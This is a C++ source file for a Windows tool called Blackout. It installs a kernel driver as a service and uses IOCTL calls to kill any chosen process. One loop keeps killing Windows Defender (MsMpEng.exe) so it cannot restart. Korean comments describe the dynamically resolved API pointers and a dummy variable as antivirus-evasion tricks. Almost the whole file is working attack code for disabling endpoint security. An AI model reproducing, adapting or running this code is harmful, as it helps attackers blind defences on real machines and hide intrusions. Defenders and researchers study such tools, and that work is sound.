#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>

// 🔐 백신 탐지 회피용 함수 포인터 선언 및 로딩
typedef HANDLE(WINAPI* pCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* pDeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* pStartServiceA)(SC_HANDLE, DWORD, LPCSTR*);
typedef SC_HANDLE(WINAPI* pCreateServiceA)(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);

pCreateFileW myCreateFileW = (pCreateFileW)GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateFileW");
pDeviceIoControl myDeviceIoControl = (pDeviceIoControl)GetProcAddress(GetModuleHandle("kernel32.dll"), "DeviceIoControl");
pStartServiceA myStartServiceA = (pStartServiceA)GetProcAddress(GetModuleHandle("advapi32.dll"), "StartServiceA");
pCreateServiceA myCreateServiceA = (pCreateServiceA)GetProcAddress(GetModuleHandle("advapi32.dll"), "CreateServiceA");

volatile int antiDetect1 = rand(); // 정적 탐지 회피용 더미

#define INITIALIZE_IOCTL_CODE 0x9876C004
#define TERMINSTE_PROCESS_IOCTL_CODE 0x9876C094

BOOL LoadDriver(char* driverPath) {
    SC_HANDLE hSCM, hService;
    const char* serviceName = "Blackout";

    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL) return (1);

    hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (hService != NULL) {
        printf("Service already exists.\n");

        SERVICE_STATUS serviceStatus;
        if (!QueryServiceStatus(hService, &serviceStatus)) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return (1);
        }

        if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {
            if (!StartServiceA(hService, 0, nullptr)) {
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                return (1);
            }
            printf("Starting service...\n");
        }

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return (0);
    }

    hService = CreateServiceA(
        hSCM, serviceName, serviceName,
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        driverPath, NULL, NULL, NULL, NULL, NULL
    );

    if (hService == NULL) {
        CloseServiceHandle(hSCM);
        return (1);
    }

    printf("Service created successfully.\n");

    if (!StartServiceA(hService, 0, nullptr)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return (1);
    }

    printf("Starting service...\n");

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return (0);
}

BOOL CheckProcess(DWORD pn) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);
        if (Process32First(hSnap, &pE)) {
            if (!pE.th32ProcessID) Process32Next(hSnap, &pE);
            do {
                if (pE.th32ProcessID == pn) {
                    CloseHandle(hSnap);
                    return (1);
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return (0);
}

DWORD GetPID(LPCWSTR pn) {
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);
        if (Process32First(hSnap, &pE)) {
            if (!pE.th32ProcessID) Process32Next(hSnap, &pE);
            do {
                if (!lstrcmpiW((LPCWSTR)pE.szExeFile, pn)) {
                    procId = pE.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Invalid number of arguments. Usage: Blackout.exe -p <process_id>\n");
        return (-1);
    }

    if (strcmp(argv[1], "-p") != 0) {
        printf("Invalid argument. Usage: Blackout.exe -p <process_id>\n");
        return (-1);
    }

    if (!CheckProcess(atoi(argv[2]))) {
        printf("provided process id doesnt exist !!\n");
        return (-1);
    }

    WIN32_FIND_DATAA fileData;
    HANDLE hFind;
    char FullDriverPath[MAX_PATH];
    BOOL once = 1;

    hFind = FindFirstFileA("Blackout.sys", &fileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        if (GetFullPathNameA(fileData.cFileName, MAX_PATH, FullDriverPath, NULL) != 0) {
            printf("driver path: %s\n", FullDriverPath);
        } else {
            printf("path not found !!\n");
            return (-1);
        }
    } else {
        printf("driver not found !!\n");
        return (-1);
    }

    printf("Loading %s driver .. \n", fileData.cFileName);

    if (LoadDriver(FullDriverPath)) {
        printf("faild to load driver ,try to run the program as administrator!!\n");
        return (-1);
    }

    printf("driver loaded successfully !!\n");

    HANDLE hDevice = myCreateFileW(L"\\\\.\\Blackout", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open handle to driver !! ");
        return (-1);
    }

    DWORD bytesReturned = 0;
    DWORD input = atoi(argv[2]);
    DWORD output[2] = { 0 };
    DWORD outputSize = sizeof(output);

    BOOL result = myDeviceIoControl(hDevice, INITIALIZE_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL);
    if (!result) {
        printf("faild to send initializing request %X !!\n", INITIALIZE_IOCTL_CODE);
        return (-1);
    }

    printf("driver initialized %X !!\n", INITIALIZE_IOCTL_CODE);

    if (GetPID(L"MsMpEng.exe") == input) {
        printf("Terminating Windows Defender ..\nkeep the program running to prevent the service from restarting it\n");
        while (0x1) {
            if (input = GetPID(L"MsMpEng.exe")) {
                if (!myDeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL)) {
                    printf("DeviceIoControl failed. Error: %X !!\n", GetLastError());
                    CloseHandle(hDevice);
                    return (-1);
                }
                if (once) {
                    printf("Defender Terminated ..\n");
                    once = 0;
                }
            }
            Sleep(700);
        }
    }

    printf("terminating process !! \n");

    result = myDeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL);
    if (!result) {
        printf("failed to terminate process: %X !!\n", GetLastError());
        CloseHandle(hDevice);
        return (-1);
    }

    printf("process has been terminated!\n");
    system("pause");
    CloseHandle(hDevice);
    return 0;
}
